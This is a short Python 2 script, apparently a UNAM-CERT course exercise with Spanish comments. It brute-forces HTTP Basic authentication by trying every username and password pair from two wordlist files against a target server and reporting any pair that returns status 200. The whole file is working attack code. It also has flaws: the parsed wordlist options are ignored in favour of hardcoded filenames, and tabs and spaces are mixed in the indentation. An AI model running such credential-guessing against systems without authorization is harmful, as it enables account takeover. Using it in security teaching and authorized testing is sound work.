#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    #Agregamos parse
    parser.add_option('-u', '--userfile', dest='archivouser', default=None, help='Archivo de usuarios.')
    parser.add_option('-w', '--passwordfile', dest='archivopassword', default=None, help='Archivo de passwrds.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def makeRequest(host, user, password):
    try:
	response = get(host, auth=(user,password))
	#print response
	#print dir(response)
	if response.status_code == 200:
	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
	else:
	    print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        with open('User.txt') as us:
            for linea in us:
                user = linea.strip('\n')                            
                with open('password.txt') as ps:
                    for linea2 in ps:           
                        passwd = linea2.strip('\n')
#                        print (user)
#                        print (passwd)
                        makeRequest(url, user, passwd)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
